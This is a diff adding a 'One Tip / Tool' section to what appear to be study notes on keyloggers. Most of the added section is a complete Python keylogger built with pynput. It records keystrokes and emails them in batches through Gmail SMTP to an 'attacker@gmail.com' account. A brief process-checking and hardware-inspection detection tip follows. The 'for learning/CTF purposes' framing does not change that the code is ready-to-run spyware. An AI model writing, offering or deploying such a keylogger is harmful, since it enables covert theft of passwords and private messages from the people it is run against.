@@ -46,3 +46,35 @@ From a defender's side, endpoint detection and response (EDR) tools monitor for 
 - API Hooking: intercepting calls to OS functions — how software keyloggers intercept keyboard input.
 - Hardware Keylogger: a physical device that sits between keyboard and computer, invisible to any software.
 - EDR (Endpoint Detection and Response): security software that monitors endpoints for suspicious behavior including keyboard hooking.
+
+## One Tip / Tool
+
+Tool: `pynput` for building keyloggers in Python (for learning/CTF purposes) and `Malwarebytes` for detection
+
+```python
+# basic keylogger with email exfiltration
+from pynput.keyboard import Key, Listener
+import smtplib
+
+keys = []
+
+def on_press(key):
+    keys.append(str(key))
+    if len(keys) > 50:
+        send_keys()
+        keys.clear()
+
+def send_keys():
+    email = "attacker@gmail.com"
+    password = "apppassword"
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, ''.join(keys))
+    server.quit()
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+```
+
+Detection tip: on Windows open Task Manager and look for unknown Python processes or suspicious background apps. On Linux run `ps aux` and check for unfamiliar processes. Hardware keyloggers can be found by physically checking the back of desktops for any device between the keyboard cable and the USB port.
